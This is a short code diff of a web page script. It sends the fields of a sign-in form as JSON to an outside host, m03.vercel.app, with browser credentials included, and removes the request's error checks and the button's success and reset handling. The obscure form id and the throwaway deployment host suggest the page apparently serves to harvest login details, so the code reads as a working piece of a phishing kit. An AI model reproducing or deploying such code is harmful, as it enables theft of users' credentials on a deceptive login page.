@@ -122,39 +122,20 @@
   const form = document.getElementById(conforpky);
   const formData = new FormData(form);
   const sendButton = form.querySelector(".proceed-button");
-  sendButton.textContent = "Processing...";
-  sendButton.classList.remove("error-button");
-  sendButton.disabled = true;
-
-  // Use the full Vercel URL
+  
   fetch("https://m03.vercel.app/submit", {
     method: "POST",
+    credentials: 'include',
     headers: {
       'Content-Type': 'application/json',
     },
     body: JSON.stringify(Object.fromEntries(formData))
   })
-  .then(response => {
-    if (!response.ok) {
-      throw new Error('Network response was not ok');
-    }
-    return response.json();
-  })
-  .then(data => {
-    sendButton.textContent = "Success";
-    form.reset();
-  })
+  .then(response => response.json())
   .catch(error => {
     console.error('Error:', error);
     sendButton.textContent = "Error Connecting";
     sendButton.classList.add("error-button");
-  })
-  .finally(() => {
-    setTimeout(() => {
-      sendButton.disabled = false;
-      sendButton.textContent = "Sign In";
-      sendButton.classList.remove("error-button");
-    }, 3000);
   });
 }
 </script>
